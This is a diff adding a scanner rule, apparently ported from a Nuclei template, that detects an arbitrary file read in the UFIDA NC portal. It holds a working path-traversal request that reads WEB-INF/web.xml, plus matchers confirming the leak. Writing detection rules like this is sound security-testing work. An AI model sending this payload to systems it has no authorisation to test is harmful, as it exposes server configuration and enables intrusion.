@@ -1,0 +1,31 @@
+schema_version: 1
+id: "cortex.community:yonyou-ufida-nc-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "UFIDA NC Portal - Arbitrary File Read"
+  description: "There is any file reading in the getFileLocal interface of UFIDA Mobile System Management. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86getFileLocal%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
+  cwes: [23]
+  tags: ["yonyou", "ufida", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "nc.bs.framework.server.WebApplicationStartupHook" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<web-app" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
